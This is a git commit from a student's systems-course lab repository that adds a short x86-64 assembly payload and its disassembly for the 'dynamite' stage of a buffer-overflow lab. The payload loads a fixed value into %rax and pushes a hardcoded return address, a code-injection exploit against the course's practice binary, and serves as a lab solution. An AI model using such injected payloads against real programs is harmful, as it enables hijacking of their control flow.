ab30df88067dd4261ccd61fb0861984d4f921061
sebsadface <ll57@cs.washington.edu>
2022-11-11 17:36:58 -0800

    dynamite update

---
+++ cse351/lab3/lab3/dynamite.d
@@ -0,0 +1,11 @@
+
+dynamite.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 b8 a1 b3 83 5a 2c 	movabs $0x1d56a22c5a83b3a1,%rax
+   7:	a2 56 1d 
+   a:	68 f3 0e 40 00       	pushq  $0x400ef3
+   f:	c3                   	retq   
---
+++ cse351/lab3/lab3/dynamite.s
@@ -0,0 +1,4 @@
+movq $0x1d56a22c5a83b3a1,%rax
+pushq $0x400ef3
+retq
+
